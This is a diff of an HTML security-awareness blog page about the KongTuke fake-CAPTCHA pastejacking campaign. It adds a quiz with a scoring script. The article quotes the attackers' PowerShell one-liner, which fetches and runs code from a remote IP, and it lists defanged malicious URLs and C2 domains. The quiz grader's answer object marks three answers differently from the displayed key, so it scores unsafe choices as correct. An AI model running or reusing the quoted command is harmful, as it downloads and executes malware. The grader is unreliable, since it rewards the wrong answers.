@@ -30,16 +30,17 @@
             <div class="container">
                 <div class="header-container">
                     <h1 id="header-placeholder"></h1>
+                    <button onclick="darkMode" id="darkModeBtn" class="dark-mode-btn"><i class="fa fa-moon-o"></i></button>
                 </div>
             </div>
         </header>
         <main>
-            <div class="content">
+            <article class="content">
                 <h1 class="title">KongTuke: The Rise of Clipboard Hijacking Through Fake CAPTCHAs</h1>
                 <p>A <strong>new cyberattack chain</strong> dubbed <strong>“KongTuke”</strong> is making headlines in the cybersecurity community for its <strong>stealthy social engineering tactics</strong> and <strong>use of fake CAPTCHA pages</strong> to hijack unsuspecting users’ clipboards. This attack, recently <a href="http://x.com/Unit42_Intel/status/1908253830166323637">document</a> by <strong>Bradley Duncan of Palo Alto Networks’ Unit 42 team</strong>, leverages legitimate but compromised websites to distribute malicious scripts, trick users, and potentially install unidentified malware on their systems.</p>
-            </div>
+            </article>
 
-            <div class="content">
+            <article class="content">
                 <h2>How the KongTuke Attack Works</h2>
                 <p>The attack begins subtly—through injected malicious scripts found on seemingly trustworthy websites. One example highlighted in the <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2025-04-04-IOCs-forKongTuke-web-inject-leading-to-fake-CAPTHA-page.txt">report</a> is: <span class="special-text">hxxps://lancasternh[.]com/6t7y.js</span> This script then loads a second-stage payload from: <span class="special-text">hxxps://lancasternh[.]com/js.php</span> <br>
                 Once a user visits the site, the malicious code collects device data, such as IP address, browser details, and referrer info—<strong>all encoded in Base64</strong> to conceal its behavior.</p>
@@ -47,30 +48,30 @@
                 <img src="../images/fakecaptchs-wiresharkanalysis.png" alt="wiresark analysis"></center>
                 <h3>The Fake CAPTCHA Trap</h3>
                 <p>The user is then redirected to a <strong>fake CAPTCHA page</strong>—designed to resemble legitimate verification systems. But unlike real CAPTCHAs that ask you to select images or check a box, this one prompts suspicious behavior like:
-                    <ul style="margin-left: 30px;">
+                    <ul class="bullet">
                         <li>Clicking strange buttons</li>
                         <li>Pressing keyboard combinations</li>
                         <li><b>Pasting commands into a Windows Run window</b></li>
                     </ul>
                 This technique is referred to as <strong>ClickFix CAPTCHA</strong>, a dangerous form of <strong>social engineering</strong> that manipulates users into executing <strong>malicious scripts</strong> by disguising them as routine verification steps.</p>
-            </div>
+            </article>
 
-            <div class="content">
+            <article class="content">
                 <h2>What is Clipboard Hijacking (Pastejacking)?</h2>
                 <p>The real danger begins once the user <strong>clicks or interacts</strong> with the fake CAPTCHA. A <strong>malicious PowerShell command</strong> is <strong>automatically copied to their clipboard</strong>—a technique called <strong>clipboard hijacking</strong> or <strong>pastejacking</strong>. <br>
                 The malware then <strong>urges the user to open a Run window (Win + R)</strong> and paste the clipboard content—unknowingly executing harmful code.
                 Here’s an example of the PowerShell payload used: <span class="special-text">powershell -w h -c "iex $(irm 138.199.156[.]22:8080/$($z = [datetime]::UtcNow; $y = ([datetime]('01/01/' + '1970')); $x = ($z - $y).TotalSeconds; $w = [math]::Floor($x); $v = $w - ($w % 16); [int64]$v))"</span>. This command connects to: <span class="special-text">138.199.156[.]22:8080</span>
                 From there, it retrieves additional malicious payloads tailored to the current timestamp.</p>
                 <center><img src="../images/fakeCAPTCHs.png" alt="fake CAPTCHAs"></center>
-            </div>
+            </article>
 
-            <div class="content">
+            <article class="content">
                 <h2>What Happens After Infection?</h2>
                 <p>According to Unit 42’s report, after the script runs:
-                    <ul style="margin-left: 30px;">
+                    <ul class="bullet">
                         <li>It sends <b>GET and POST requests</b> to its C2 (Command-and-Control) server.</li>
                         <li>Communicates with suspicious domains like:</li>
-                        <ul class="special-text" style="margin-left: 30px;">
+                        <ul class="special-text" class="bullet">
                             <li>ecduutcykpvkbim[.]top</li>
                             <li>bfidmcjejlilflg[.]top</li>
                         </ul>
@@ -78,22 +79,22 @@
                     </ul>
                 Yet, the <strong>final malware payload remains unknown</strong>, making the threat more dangerous because its endgame is still concealed.</p>
                 <center><img src="../images/fakecaptchs-c2.png" alt="C2 server"></center>
-            </div>
+            </article>
 
-            <div class="content">
+            <article class="content">
                 <h2>Why KongTuke Is So Dangerous</h2>
-                <ul style="margin-left: 30px;">
+                <ul class="bullet">
                     <li><b>Trusted Sources</b>: Attackers use legitimate, vulnerable websites, which makes users feel safe and lowers suspicion.</li>
                     <li><b>Realistic CAPTCHAs</b>: The design of the fake CAPTCHA closely mimics authentic ones—tricking users into performing harmful actions.</li>
                     <li><b>Command Injection via Clipboard</b>: A rare but effective method of exploiting human behavior.</li>
                     <li><b>Global Threat</b>: While no specific region is exclusively targeted, this attack can affect any user who visits a compromised website.</li>
                 </ul>
-            </div>
+            </article>
 
-            <div class="content">
+            <article class="content">
                 <h2>Protect Yourself from KongTuke and Similar Threats</h2>
                 <p>To defend against this evolving threat, cybersecurity experts recommend the following:
-                    <ul style="margin-left: 30px;">
+                    <ul class="bullet">
                         <li><b>Never paste or run unknown commands</b>: If a website asks you to copy/paste something into a Run prompt, close the site immediately.</li>
                         <li><b>Verify CAPTCHA behavior</b>: Legit CAPTCHAs never ask for system interaction, key presses, or command execution.</li>
                         <li><b>Use updated security software</b>: Install trusted antivirus and anti-malware solutions with web protection to detect malicious scripts.</li>
@@ -101,17 +102,73 @@
                         <li><b>Educate users in your network</b>: Especially in business environments, ensure users are trained to identify fake CAPTCHAs and clipboard hijacking attempts.</li>
                     </ul>
                 </p>
-            </div>
+            </article>
 
-            <div class="content">
+            <article class="content">
                 <p>The KongTuke cyberattack is a clear reminder of how advanced threat actors are exploiting human behavior and trust in web design. By using <strong>fake CAPTCHAs</strong>, <strong>clipboard hijacking</strong>, and malicious scripting, attackers manipulate users into becoming their own attack vectors. <br>
                 As researchers like Bradley Duncan and platforms like <strong>Unit 42</strong> continue to analyze this campaign, staying informed is <strong>your first line of defense</strong>. <br>
                 🔒 <i>When in doubt, don’t click. Don’t paste. Stay secure.</i></p>
-            </div>
+            </article>
 
             <div class="content">
                 <p><a href="../blogs/blogs.html"><b>READ MORE BLOGS</b></a></p>
             </div>
+
+            <section>
+                <div class="quiz-container">
+                    <form id="quizForm">
+                        <div class="question">
+                            <h1 style="text-align: center;">Quiz: Kongtuke Clipboard Malware Security Safety</h1>
+                            <p>Take this quick quiz to evaluate your understanding on Kongtuke malware. Choose the most appropriate answer for each question.</p>
+                            <h3>1. You visit a website, and a CAPTCHA prompts you to copy and paste a command into the Run window. What should you do?</h3>
+                            <ul class="options">
+                                <li><input type="radio" name="qus1" value="A"> Paste the command to proceed quickly.</li>
+                                <li><input type="radio" name="qus1" value="B"> Close the site immediately and verify the website's legitimacy.</li>
+                                <li><input type="radio" name="qus1" value="C"> Ask someone for advice on executing the command.</li>
+                                <li><input type="radio" name="qus1" value="D"> Refresh the page and try again.</li>
+                            </ul>
+                        </div>
+                        <div class="question">
+                            <h3>2. You notice that your clipboard contains a PowerShell command you didn’t copy. What action should you take next?</h3>
+                            <ul class="options">
+                                <li><input type="radio" name="qus2" value="A"> Run the command to see what it does.</li>
+                                <li><input type="radio" name="qus2" value="B"> Clear your clipboard and run a malware scan.</li>
+                                <li><input type="radio" name="qus2" value="C"> Paste it into a text file for safekeeping.</li>
+                                <li><input type="radio" name="qus2" value="D">  Ignore it and continue browsing.</li>
+                            </ul>
+                        </div>
+                        <div class="question">
+                            <h3>3. A CAPTCHA page asks you to press certain keys or interact with your system (e.g., open the Run window). How do you react?</h3>
+                            <ul class="options">
+                                <li><input type="radio" name="qus3" value="A"> Comply with the instructions since CAPTCHAs are always safe.</li>
+                                <li><input type="radio" name="qus3" value="B"> Check if the CAPTCHA looks unusual or performs unexpected actions.</li>
+                                <li><input type="radio" name="qus3" value="C"> Save the page link for later review.</li>
+                                <li><input type="radio" name="qus3" value="D"> Continue interacting with the site to finish your task.</li>
+                            </ul>
+                        </div>
+                        <div class="question">
+                            <h3>4. A colleague in your network reports encountering a similar fake CAPTCHA page. What steps should you recommend?</h3>
+                            <ul class="options">
+                                <li><input type="radio" name="qus4" value="A"> Suggest ignoring the issue.</li>
+                                <li><input type="radio" name="qus4" value="B"> Advise them to update their browser and report the website to your security team.</li>
+                                <li><input type="radio" name="qus4" value="C"> Ask them to replicate the steps to see if it happens again.</li>
+                                <li><input type="radio" name="qus4" value="D"> Recommend uninstalling their browser altogether.</li>
+                            </ul>
+                        </div>
+                        <div class="question">
+                            <h3>5. Imagine you unknowingly paste a malicious command into the Run window. What should you do immediately?</h3>
+                            <ul class="options">
+                                <li><input type="radio" name="qus5" value="A"> Disconnect from the internet and run a full system malware scan</li>
+                                <li><input type="radio" name="qus5" value="B"> Restart your system and hope the issue resolves itself.</li>
+                                <li><input type="radio" name="qus5" value="C"> Contact the website admin for help.</li>
+                                <li><input type="radio" name="qus5" value="D"> Continue working unless noticeable changes occur.</li>
+                            </ul>
+                        </div>
+                        <button type="button" onclick="submitQuiz()" class="submit-btn">Submit</button>
+                    </form>
+                    <div id="result"></div>
+                </div>
+            </section>
         </main>
 
         <footer>
@@ -122,5 +179,40 @@
         <!-- Google tag (gtag.js) -->
         <script async src="https://www.googletagmanager.com/gtag/js?id=G-8B85G396XZ"></script>
         <script src="../function.js"></script>
+        <script>
+            // quiz
+            function submitQuiz() {
+                const answers = {
+                    qus1: "B",
+                    qus2: "A",
+                    qus3: "B",
+                    qus4: "A",
+                    qus5: "B",
+                };
+
+                const form = document.getElementById('quizForm');
+                let score = 0;
+
+                for (let question in answers) {
+                    const selected = form[question].value;
+                    if (selected === answers[question]) {
+                        score++;
+                    }
+                }
+
+                const totalQuestions = Object.keys(answers).length;
+                document.getElementById('result').innerHTML = `<div class="quiz-ans">
+                    <h2>Your Score: ${score}/${totalQuestions}</h2>
+                    <p>${score === totalQuestions ? "Excellent! You’re well-prepared to protect your system devices." : score > 2 ? "Good job! Review the topics you missed to further enhance your security." : "Time to brush up on your cybersecurity knowledge. Start with the tips in this blog!"}</p> <br>
+                    <p>Answer Key:</p>
+                    <ul style="margin-left: 30px;">
+                        <li>B. Close the site immediately and verify the website's legitimacy.</li>
+                        <li>B. Clear your clipboard and run a malware scan.</li>
+                        <li>B. Check if the CAPTCHA looks unusual or performs unexpected actions.</li>
+                        <li>B. Advise them to update their browser and report the website to your security team.</li>
+                        <li>A. Disconnect from the internet and run a full system malware scan.</li>
+                        </div>`;
+            }
+        </script>
     </body>
 </html>
